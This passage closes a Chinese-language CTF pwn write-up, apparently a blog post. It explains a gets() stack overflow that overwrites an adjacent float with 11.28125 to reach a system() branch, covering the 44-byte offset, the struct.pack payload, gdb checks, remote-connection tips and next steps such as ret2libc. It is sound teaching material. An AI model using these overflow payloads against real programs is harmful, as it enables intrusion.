{% note info **Q2：为什么 payload 总长是 48，比偏移多 4？** %}
`44` 是填充长度，后面还要写 4 字节浮点数，所以总长是 `44 + 4 = 48`。偏移是“走到目标变量起点”的距离，payload 长度是“填充 + 目标值”的总长度，两者不是一回事。
{% endnote %}

{% note info **Q3：`struct.pack` 和 `p32` 有什么区别？** %}
`p32(0x41348000)` 和 `struct.pack('<f', 11.28125)` 得到的 4 个字节完全一样。区别在于 `p32` 需要你先手算浮点数的 IEEE 754 位模式，`struct.pack('<f', ...)` 让 Python 按 C 的 `float` 语义帮你算。初学阶段用 `struct` 更不容易错，等熟练了直接写 `p32(0x41348000)` 也很常见。
{% endnote %}

{% note info **Q4：为什么 `p $xmm0.v4_float[0]` 能看到 11.28125？** %}
`xmm0` 是 128 位寄存器，`v4_float` 把它按 4 个单精度浮点数解释，`[0]` 取最低的 32 位。`movss xmm0, [rbp-0x4]` 执行后，低 32 位就是 `v2` 的位模式，按 float 解释正好是 `11.28125`。如果停在这条指令之前，`xmm0` 还是旧值，可以改用 `p *(float*)($rbp-0x4)`。
{% endnote %}

{% note info **Q5：`gdb.debug` 报错 / 不弹窗口怎么办？** %}
`gdb.debug` 需要另开一个终端，`context.terminal` 必须写对。用 tmux 就先 `tmux` 进会话，再配 `["tmux", "new-window"]`；桌面环境可以试 `["gnome-terminal", "--", "bash", "-c"]` 或 `["xterm", "-e", "bash", "-c"]`。实在搞不定，可以先用 `process('./pwn3')` 跑通逻辑，再手动 `gdb -p` attach。
{% endnote %}

{% note info **Q6：payload 里的 `\x00` 会被 `gets` 截断吗？** %}
不会。`gets` 是按字节读到换行或 EOF，`\x00` 只是普通字节，不是终止符。真正让 `gets` 停下的是 `sendline` 补的 `\n`。浮点数 `11.28125` 打包后第一个字节就是 `\x00`，如果 `gets` 会被 `\x00` 截断，这题根本没法做。
{% endnote %}

{% note info **Q7：为什么这次没有崩，只看到 EOF？** %}
返回地址在 `rbp+8`，我们的 48 字节 payload 没有碰到它，所以 `func` 能正常返回、`system` 能正常执行。不过 `gets` 补的 `\0` 会落在 `rbp`，把保存的 rbp 最低字节清零，进程收尾时可能踩到脏的 rbp。flag 已经打印出来了，最后是 EOF 还是崩溃都无所谓。
{% endnote %}

{% note info **Q8：远程连不上怎么办？** %}
先确认平台类型：`*.tcp-ctf2.dasctf.com` 这类走 TLS，必须 `remote(HOST, PORT, ssl=True, sni=HOST)`；普通 `nc` 靶场直接 `remote(HOST, PORT)`，加了 `ssl=True` 反而连不上。其次确认靶场没过期，这类临时地址失效是常态。
{% endnote %}

{% note info **Q9：为什么 `11.28125` 能精确比较，别的数行不行？** %}
`11.28125 = 11 + 9/32`，转成二进制是有限的 `1011.01001₂`，单精度 23 位尾数放得下，所以能精确表示。像 `0.1`、`11.1` 这种十进制有限但二进制无限循环的数，float 存进去会有舍入误差，用 `==` 比较就不可靠了。CTF 里遇到浮点数比较，先确认这个数是不是“二进制友好”的。
{% endnote %}

{% note info **Q10：为什么这题不需要处理栈对齐？** %}
栈对齐只在“`call` 一条 libc 函数且栈位置不对”的时候才会出问题。这题走的是 `if` 分支，`system` 是函数自己 `call` 的，`rsp` 在函数内部天然对齐；另一种打法跳 `0x4006be`，`ret` 之后 `rsp % 16 == 0`，也正好满足 `call` 前的要求。所以两条路都不用额外加 `ret` gadget。
{% endnote %}

## 完整流程速查

| 步骤 | 目的 | 操作 |
| --- | --- | --- |
| 1 | 看文件类型 | `file pwn3`，确认 `not stripped`、64 位 |
| 2 | 看保护 | `checksec --file=pwn3`，No canary、No PIE、NX enabled |
| 3 | 找入口 | IDA 打开，`main` 只调用 `func` |
| 4 | 找漏洞 | `func` 里 `gets(v1)`，`v1` 在 `rbp-0x30` |
| 5 | 找目标 | `float v2` 在 `rbp-0x4`，要等于 `11.28125` |
| 6 | 算偏移 | `0x30 - 0x4 = 0x2c = 44` |
| 7 | 算浮点字节 | `struct.pack('<f', 11.28125)` → `00 80 34 41` |
| 8 | 写 exp | `b'A'*44 + struct.pack('<f', 11.28125)`，共 48 字节 |
| 9 | gdb 验证 | `gdb.debug` + `b func` + `ni` 到 `gets` 后，看 `xmm0` 和栈 |
| 10 | 打远程 | 换回 `remote`，`sendline`，拿 flag |

## 小结

这道题表面上是“猜数字”，实际上把 pwn 入门里几个很容易被忽略的点串了起来：

- **栈溢出的目标不一定是返回地址**。缓冲区后面紧挨着的局部变量，只要程序会用它做判断，就可以是溢出目标。这题的 `v2` 就在 `v1` 后面 44 字节处。
- **偏移要看变量地址，不要看栈帧大小**。`0x30` 是整个局部变量区，`v2` 的起点是 `0x2c`，差 4 个字节就是另一条路。
- **浮点数在内存里是位模式**。`11.28125` → `0x41348000` → 小端 `00 80 34 41`，和整数打包是两套东西，`struct.pack('<f', ...)` 是最省心的写法。
- **`<f` 和 `<d` 不能混**。用错长度，不仅 `v2` 的值不对，还会顺手写坏保存的 rbp。
- **能打通不等于理解对了**。用 `gdb.debug` 停在 `gets` 之后，看 `xmm0`、看 `rbp-0x4`、看栈上的字节，三项都对，才算真的验证过。
- **`gets` 会补 `\0`**。第 49 个字节落在 `rbp` 上，这是很多“明明打进去了但退出不干净”的原因。

下一题可以往这几个方向走：

| 方向 | 要解决的问题 |
| --- | --- |
| 32 位 ret2text | 地址 4 字节，用 `p32`；参数从栈上传 |
| 覆盖变量 + canary | canary 在缓冲区和 rbp 之间，得先泄露 |
| 有 PIE | 先泄露基址，再算真实地址 |
| 没有后门 | ret2libc：泄露 libc 地址，找 `system` 和 `/bin/sh` |
| 浮点数比较更复杂 | 用 `struct` 精确还原 C 的数值类型 |

{% note success %}
**一条经验**：看到 `gets` 之后，先问自己三个问题——**写到哪、能写多长、写完谁会读**。这题“写到 `v1`、能写无限长、`v2` 会被读”，答案自然就出来了。工具只是手，思路才是关键。
{% endnote %}
